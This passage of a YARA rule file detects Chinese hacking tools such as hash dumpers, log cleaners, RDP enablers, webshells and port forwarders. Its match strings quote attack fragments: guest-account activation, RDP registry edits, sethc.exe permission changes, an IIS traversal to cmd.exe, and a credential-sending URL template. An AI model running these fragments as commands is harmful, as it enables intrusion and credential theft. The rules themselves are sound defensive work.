ChineseHacktools_WebScan_WebScan\n{\n    meta:\n        description = \"Chinese hacktool (file: WebScan.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_WebScan_WebScan\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"wwwscan.exe\" fullword wide\n        $s2 = \"WWWScan Gui\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 700KB and all of them\n}\n\nrule ChineseHacktools_GetHashes_2\n{\n    meta:\n        description = \"Chinese hacktool (file: GetHashes.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_GetHashes_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"GetHashes.exe <SAM registry file> [System key file]\" fullword ascii\n        $s2 = \"GetHashes.exe $Local\" fullword ascii\n        $s3 = \"The system key doesn't match SAM registry file!\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and 2 of them\n}\n\nrule ChineseHacktools_Acunetix_Web_Vulnerability_Scanner_8_x_Enterprise_Edition_KeyGen\n{\n    meta:\n        description = \"Chinese hacktool (file: Acunetix_Web_Vulnerability_Scanner_8.x_Enterprise_Edition_KeyGen.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Acunetix_Web_Vulnerability_Scanner_8_x_Enterprise_Edition_KeyGen\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"<description>Patch</description>\" fullword ascii\n        $s2 = \"\\\\dup2patcher.dll\" fullword ascii\n        $s3 = \"load_patcher\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 4000KB and all of them\n}\n\nrule ChineseHacktools_Tuoku_script_oracle_2\n{\n    meta:\n        description = \"Chinese hacktool (file: oracle.txt)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Tuoku_script_oracle_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"webshell\" fullword ascii\n        $s1 = \"Silic Group Hacker Army \" fullword ascii\n\n    condition:\n        filesize < 3KB and all of them\n}\n\nrule ChineseHacktools_net_packet_capt\n{\n    meta:\n        description = \"Chinese hacktool (file: net_packet_capt.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_net_packet_capt\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"(*.sfd)\" fullword ascii\n        $s2 = \"GetLaBA\" fullword ascii\n        $s3 = \"GAIsProcessorFeature\" fullword ascii\n        $s4 = \"- Gablto \" ascii\n        $s5 = \"PaneWyedit\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 50KB and all of them\n}\n\nrule ChineseHacktools_CleanIISLog\n{\n    meta:\n        description = \"Chinese hacktool (file: CleanIISLog.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_CleanIISLog\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Usage: CleanIISLog <LogFile>|<.> <CleanIP>|<.>\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule ChineseHacktools_HASH_pwhash\n{\n    meta:\n        description = \"Chinese hacktool (file: pwhash.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_HASH_pwhash\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Example: quarks-pwdump.exe --dump-hash-domain --with-history\" fullword ascii\n        $s2 = \"quarks-pwdump.exe <options> <NTDS file>\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and 1 of them\n}\n\nrule ChineseHacktools_cleaner_cl_2\n{\n    meta:\n        description = \"Chinese hacktool (file: cl.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_cleaner_cl_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"cl -eventlog All/Application/System/Security\" fullword ascii\n        $s1 = \"clear iislog error!\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 50KB and all of them\n}\n\nrule ChineseHacktools_SqlMap_Python_Run\n{\n    meta:\n        description = \"Chinese hacktool (file: Run.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_SqlMap_Python_Run\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \".\\\\Run.log\" fullword ascii\n        $s2 = \"[root@Hacker~]# Sqlmap \" fullword ascii\n        $s3 = \"%sSqlmap %s\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 30KB and all of them\n}\n\nrule ChineseHacktools_SAMInside\n{\n    meta:\n        description = \"Chinese hacktool (file: SAMInside.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_SAMInside\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"www.InsidePro.com\" fullword wide\n        $s1 = \"SAMInside.exe\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 650KB and all of them\n}\n\nrule ChineseHacktools_WebScan_wwwscan\n{\n    meta:\n        description = \"Chinese hacktool (file: wwwscan.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_WebScan_wwwscan\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"%s www.target.com -p 8080 -m 10 -t 16\" fullword ascii\n        $s2 = \"GET /nothisexistpage.html HTTP/1.1\" fullword ascii\n        $s3 = \"<Usage>:  %s <HostName|Ip> [Options]\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 60KB and all of them\n}\n\nrule ChineseHacktools_sig_3389_2_3389\n{\n    meta:\n        description = \"Chinese hacktool (file: 3389.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_sig_3389_2_3389\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"C:\\\\Documents and Settings\\\\Administrator\\\\\" fullword ascii\n        $s2 = \"net user guest /active:yes\" fullword ascii\n        $s3 = \"\\\\Microsoft Word.exe\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 80KB and all of them\n}\n\nrule ChineseHacktools_PHP_php11\n{\n    meta:\n        description = \"Chinese hacktool (file: php11.txt)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_PHP_php11\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"<tr><td><b><?php if (!$win) {echo wordwrap(myshellexec('id'),90,'<br>',1);} else\" ascii\n        $s2 = \"foreach (glob($_GET['pathtomass'].\\\"/*.htm\\\") as $injectj00) {\" fullword ascii\n        $s3 = \"echo '[cPanel Found] '.$login.':'.$pass.\\\"  Success\\\\n\\\";\" fullword ascii\n\n    condition:\n        filesize < 800KB and all of them\n}\n\nrule ChineseHacktools_WebCruiserWVS\n{\n    meta:\n        description = \"Chinese hacktool (file: WebCruiserWVS.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_WebCruiserWVS\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"id:uid:user:username:password:access:account:accounts:admin_id:admin_name:admin_\" ascii\n        $s1 = \"Created By WebCruiser - Web Vulnerability Scanner http://sec4app.com\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 700KB and all of them\n}\n\nrule ChineseHacktools_Hookmsgina\n{\n    meta:\n        description = \"Chinese hacktool (file: Hookmsgina.dll)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Hookmsgina\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"\\\\\\\\.\\\\pipe\\\\WinlogonHack\" fullword ascii\n        $s2 = \"%s?host=%s&domain=%s&user=%s&pass=%s&port=%u\" fullword ascii\n        $s3 = \"Global\\\\WinlogonHack_Load%u\" fullword ascii\n        $s4 = \"Hookmsgina.dll\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule ChineseHacktools_sig_3389_xp3389\n{\n    meta:\n        description = \"Chinese hacktool (file: xp3389.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_sig_3389_xp3389\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"echo \\\"fdenytsconnections\\\"=dword:00000000 >> c:\\\\reg.reg\" fullword ascii\n        $s2 = \"echo [HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server] >\" ascii\n        $s3 = \"echo \\\"Tsenabled\\\"=dword:00000001 >> c:\\\\reg.reg\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 20KB and all of them\n}\n\nrule ChineseHacktools_CookiesView\n{\n    meta:\n        description = \"Chinese hacktool (file: CookiesView.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_CookiesView\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"V1.0  Http://www.darkst.com Code:New4\" fullword ascii\n        $s1 = \"maotpo@126.com\" fullword ascii\n        $s2 = \"www.baidu.com\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 640KB and all of them\n}\n\nrule ChineseHacktools_T00ls_Lpk_Sethc_v4_LPK\n{\n    meta:\n        description = \"Chinese hacktool (file: LPK.DAT)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_T00ls_Lpk_Sethc_v4_LPK\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"http://127.0.0.1/1.exe\" fullword wide\n        $s2 = \"FreeHostKillexe.exe\" fullword ascii\n        $s3 = \"\\\\sethc.exe /G everyone:F\" fullword ascii\n        $s4 = \"c:\\\\1.exe\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and 1 of them\n}\n\nrule ChineseHacktools_ScanHistory\n{\n    meta:\n        description = \"Chinese hacktool (file: ScanHistory.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_ScanHistory\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"ScanHistory.exe\" fullword wide\n        $s2 = \".\\\\Report.dat\" fullword wide\n        $s3 = \"select  * from  Results order by scandate desc\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule ChineseHacktools_InvasionErasor\n{\n    meta:\n        description = \"Chinese hacktool (file: InvasionErasor.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_InvasionErasor\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"c:\\\\windows\\\\system32\\\\config\\\\*.*\" fullword wide\n        $s2 = \"c:\\\\winnt\\\\*.txt\" fullword wide\n        $s3 = \"Command1\" fullword ascii\n        $s4 = \"Win2003\" fullword ascii\n        $s5 = \"Win 2000\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 60KB and all of them\n}\n\nrule ChineseHacktools_super_Injection1\n{\n    meta:\n        description = \"Chinese hacktool (file: super Injection1.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_super_Injection1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s2 = \"Invalid owner=This control requires version 4.70 or greater of COMCTL32.DLL\" fullword wide\n        $s3 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\" fullword ascii\n        $s4 = \"ScanInject.log\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 2000KB and all of them\n}\n\nrule ChineseHacktools_Pk_Pker\n{\n    meta:\n        description = \"Chinese hacktool (file: Pker.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Pk_Pker\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"/msadc/..%5c..%5c..%5c..%5cwinnt/system32/cmd.exe\" fullword wide\n        $s2 = \"msadc/..\\\\..\\\\..\\\\..\\\\winnt/system32/cmd.exe\" fullword wide\n        $s3 = \"--Made by VerKey&Only_Guest&Bincker\" fullword wide\n        $s4 = \";APPLET;EMBED;FRAMESET;HEAD;NOFRAMES;NOSCRIPT;OBJECT;SCRIPT;STYLE;\" fullword wide\n        $s5 = \" --Welcome to Www.Pker.In Made by V.K\" fullword wide\n        $s6 = \"Report.dat\" fullword wide\n        $s7 = \".\\\\Report.dat\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 500KB and 5 of them\n}\n\nrule ChineseHacktools_GetPass_GetPass\n{\n    meta:\n        description = \"Chinese hacktool (file: GetPass.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_GetPass_GetPass\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"\\\\only\\\\Desktop\\\\\" ascii\n        $s2 = \"To Run As Administuor\" ascii\n        $s3 = \"Key to EXIT ... & pause > nul\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule ChineseHacktools_F4ck_Team_f4ck_3\n{\n    meta:\n        description = \"Chinese hacktool (file: f4ck.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_F4ck_Team_f4ck_3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"File UserName PassWord [comment] /add\" fullword ascii\n        $s2 = \"No Net.exe Add User\" fullword ascii\n        $s3 = \"BlackMoon RunTime Error:\" fullword ascii\n        $s4 = \"Team.F4ck.Net\" fullword wide\n        $s5 = \"admin 123456789\" fullword ascii\n        $s6 = \"blackmoon\" fullword ascii\n        $s7 = \"f4ck Team\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and 4 of them\n}\n\nrule ChineseHacktools_F4ck_Team_F4ck_3\n{\n    meta:\n        description = \"Chinese hacktool (file: F4ck_3.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_F4ck_Team_F4ck_3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"F4ck.exe\" fullword wide\n        $s2 = \"@Netapi32.dll\" fullword ascii\n        $s3 = \"Team.F4ck.Net\" fullword wide\n        $s6 = \"NO Net Add User\" fullword wide\n        $s7 = \"DLL ERROR\" fullword ascii\n        $s11 = \"F4ck Team\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and 3 of them\n}\n\nrule ChineseHacktools_ACCESS_brute\n{\n    meta:\n        description = \"Chinese hacktool (file: ACCESS_brute.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_ACCESS_brute\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \".dns166.co\" ascii\n        $s2 = \"SExecuteA\" ascii\n        $s3 = \"ality/clsCom\" ascii\n        $s4 = \"NT_SINK_AddRef\" ascii\n        $s5 = \"WINDOWS\\\\Syswm\" ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 20KB and all of them\n}\n\nrule ChineseHacktools_Fpipe_FPipe\n{\n    meta:\n        description = \"Chinese hacktool (file: FPipe.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Fpipe_FPipe\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Unable to create TCP listen socket. %s%d\" fullword ascii\n        $s2 = \"http://www.foundstone.com\" fullword ascii\n        $s3 = \"%s %s port %d. Address is already in use\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 20KB and all of them\n}\n\nrule ChineseHacktools_Layer_Layer\n{\n    meta:\n        description = \"Chinese hacktool (file: Layer.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Layer_Layer\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"\\\\Release\\\\Layer.pdb\" fullword ascii\n        $s2 = \"Layer.exe\" fullword wide\n        $s3 = \"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule ChineseHacktools_ms10048_x86_\n{\n    meta:\n        description = \"Chinese hacktool (file: ms10048-x86.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_ms10048_x86\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"[+] Set to %d exploit half succeeded\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 30KB and all of them\n}\n\nrule ChineseHacktools_HTran2_4\n{\n    meta:\n        description = \"Chinese hacktool (file: HTran2.4.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_HTran2_4\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Enter Your Socks Type No: [0.BindPort 1.ConnectBack 2.Listen]:\" fullword ascii\n        $s2 = \"[+] New connection %s:%d !!\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 180KB and all of them\n}\n\nrule ChineseHacktools_SkinHRootkit_SkinH\n{\n    meta:\n        description = \"Chinese hacktool (file: SkinH.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_SkinHRootkit_SkinH\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"(C)360.cn Inc.All Rights Reserved.\" fullword wide\n        $s1 = \"SDVersion.dll\" fullword wide\n        $s2 = \"skinh.dll\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 2000KB and all of them\n}\n\nrule ChineseHacktools_PostgreSQL_mysql_injectV1_1_Creak_Oracle_SQLServer_inject_Creaked\n{\n    meta:\n        description = \"Chinese hacktool\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker__PostgreSQL_mysql_injectV1_1_Creak_Oracle_SQLServer_inject_Creaked\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"zhaoxypass@yahoo.com.cn\" fullword ascii\n        $s2 = \"Mozilla/3.0 (compatible; Indy Library)\" fullword ascii\n        $s3 = \"ProxyParams.ProxyPort\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and all of them\n}\n\nrule ChineseHacktools_wwwscan_wwwscan_wwwscan_gui\n{\n    meta:\n        description = \"Chinese hacktool (files: wwwscan.exe, wwwscan.exe, wwwscan_gui.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker__wwwscan_wwwscan_wwwscan_gui\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"GET /nothisexistpage.html HTTP/1.1\" fullword ascii\n        $s2 = \"<Usage>:  %s <HostName|Ip> [Options]\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule ChineseHacktools_LPK_LPK_LPK\n{\n    meta:\n        description = \"Chinese hacktool (files: LPK.DAT, LPK.DAT, LPK.DAT)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker__LPK_LPK_LPK\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"C:\\\\WINDOWS\\\\system32\\\\cmd.exe\" fullword wide\n        $s2 = \"Password error!\" fullword ascii\n        $s3 = \"\\\\sathc.exe\" fullword ascii\n        $s4 = \"\\\\sothc.exe\" fullword ascii\n        $s5 = \"\\\\lpksethc.bat\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1057KB and all of them\n}\n\nrule ChineseHacktools_builder_shift_SkinH\n{\n    meta:\n        description = \"Chinese hacktool (files: builder.exe, shift.exe, SkinH.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker__builder_shift_SkinH\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"lipboard\" fullword ascii\n        $s2 = \"uxthem\" fullword ascii\n        $s3 = \"ENIGMA\" fullword ascii\n        $s4 = \"UtilW0ndow\" fullword ascii\n        $s5 = \"prog3am\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 6075KB and all of them\n}\n\nrule ChineseHacktools_lcx_HTran2_4_htran20\n{\n    meta:\n        description = \"Chinese hacktool (files: lcx.exe, HTran2.4.exe, htran20.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 